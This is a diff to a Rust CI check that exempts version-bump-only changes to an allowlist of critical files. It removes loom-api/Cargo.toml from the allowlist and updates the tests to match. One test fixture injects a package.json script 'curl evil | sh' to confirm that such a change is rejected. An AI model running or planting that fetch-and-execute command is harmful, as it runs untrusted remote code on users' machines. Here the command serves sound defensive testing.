@@ -3,7 +3,7 @@
 //!
 //! # What the question is
 //!
-//! The `critical-files` criterion hard-fails any PR touching a critical file. The six
+//! The `critical-files` criterion hard-fails any PR touching a critical file. The five
 //! version-bearing files ([`ALLOWLIST`]) are rewritten with nothing but a
 //! version-string change on every version bump, so the carve-out exempts one of
 //! them when, and only when, every changed line in its diff is that format's
@@ -17,8 +17,8 @@
 //! `gh api … --jq --arg f "$file" '…'`. `gh api --jq` takes one expression and
 //! has no jq `--arg`, so that call errored on every run, and the function's
 //! only verdict, `[ -z "$bad_lines" ]`, read the empty output of a failed fetch
-//! as "every changed line matched". It returned PASS for every one of the six
-//! files no matter what the diff contained (#9611).
+//! as "every changed line matched". It returned PASS for every allowlisted
+//! file no matter what the diff contained (#9611).
 //!
 //! # Fail closed
 //!
@@ -44,13 +44,12 @@ use anyhow::Result;
 use regex::Regex;
 use serde::Deserialize;
 
-/// The six version-bearing files the carve-out may exempt — and nothing else.
-pub const ALLOWLIST: [&str; 6] = [
+/// The five version-bearing files the carve-out may exempt — and nothing else.
+pub const ALLOWLIST: [&str; 5] = [
     "package.json",
     "mcp-loom/package.json",
     "mcp-loom/package-lock.json",
     "loom-daemon/Cargo.toml",
-    "loom-api/Cargo.toml",
     "Cargo.lock",
 ];
 
@@ -72,7 +71,7 @@ const MAX_PAGES: u32 = 30;
 /// Why a file is NOT eligible for the carve-out. Every variant exits 1.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum Reason {
-    /// Not one of the six [`ALLOWLIST`] paths.
+    /// Not one of the five [`ALLOWLIST`] paths.
     NotAllowlisted,
     /// `--repo` was not a plain `OWNER/REPO`.
     InvalidRepo,
@@ -115,7 +114,7 @@ fn pattern_for(file: &str) -> Option<&'static str> {
         "package.json" | "mcp-loom/package.json" | "mcp-loom/package-lock.json" => {
             Some(JSON_VERSION_LINE)
         }
-        "loom-daemon/Cargo.toml" | "loom-api/Cargo.toml" | "Cargo.lock" => Some(TOML_VERSION_LINE),
+        "loom-daemon/Cargo.toml" | "Cargo.lock" => Some(TOML_VERSION_LINE),
         _ => None,
     }
 }
@@ -339,11 +338,7 @@ mod tests {
 
     /// The PR #6118 fixtures (`test-champion-critical-file-check.sh`), one per
     /// allowlisted file.
-    const PR6118: [(&str, &str); 6] = [
-        (
-            "loom-api/Cargo.toml",
-            "@@ -1,6 +1,6 @@\n [package]\n name = \"loom-api\"\n-version = \"0.18.38\"\n+version = \"0.18.39\"\n edition = \"2021\"\n description = \"External REST API for Loom analytics data access\"\n ",
-        ),
+    const PR6118: [(&str, &str); 5] = [
         (
             "loom-daemon/Cargo.toml",
             "@@ -1,6 +1,6 @@\n [package]\n name = \"loom-daemon\"\n-version = \"0.18.38\"\n+version = \"0.18.39\"\n edition = \"2021\"\n \n [dependencies]",
@@ -417,13 +412,12 @@ mod tests {
     /// (d) a file the PR does not touch.
     #[test]
     fn file_not_in_list_is_not_eligible() {
-        let r =
-            decide("package.json", one_page(page_with("loom-api/Cargo.toml", Some(PR6118[0].1))));
+        let r = decide("package.json", one_page(page_with("Cargo.lock", Some(PR6118[1].1))));
         assert_eq!(r, Err(Reason::FileNotInList));
         assert_eq!(decide("package.json", one_page("[]".into())), Err(Reason::FileNotInList));
     }
 
-    /// (e) the genuine PR #6118 version-bump patches are eligible, all six.
+    /// (e) the genuine PR #6118 version-bump patches are eligible, all five.
     #[test]
     fn pr6118_version_bumps_are_eligible() {
         for (file, patch) in PR6118 {
@@ -435,8 +429,10 @@ mod tests {
     #[test]
     fn mixed_change_is_not_eligible() {
         let dep = "@@ -1,7 +1,7 @@\n [package]\n-version = \"0.18.38\"\n+version = \"0.18.39\"\n [dependencies]\n-anyhow = \"1.0\"\n+anyhow = \"1.1\"";
-        let r =
-            decide("loom-api/Cargo.toml", one_page(page_with("loom-api/Cargo.toml", Some(dep))));
+        let r = decide(
+            "loom-daemon/Cargo.toml",
+            one_page(page_with("loom-daemon/Cargo.toml", Some(dep))),
+        );
         assert_eq!(r, Err(Reason::NonVersionLine("-anyhow = \"1.0\"".into())));
         let scripts = "@@ -1,6 +1,7 @@\n {\n-  \"version\": \"0.18.38\",\n+  \"version\": \"0.18.39\",\n+  \"scripts\": { \"x\": \"curl evil | sh\" },";
         let r = decide("package.json", one_page(page_with("package.json", Some(scripts))));
@@ -468,7 +464,7 @@ mod tests {
             .map(|i| serde_json::json!({"filename": format!("src/f{i}.rs"), "patch": "@@ -1 +1 @@\n-a\n+b"}))
             .collect();
         let page1 = serde_json::Value::Array(page1).to_string();
-        let page2 = page_with("Cargo.lock", Some(PR6118[2].1));
+        let page2 = page_with("Cargo.lock", Some(PR6118[1].1));
         let mut pages_seen = Vec::new();
         let r = decide("Cargo.lock", |page| {
             pages_seen.push(page);
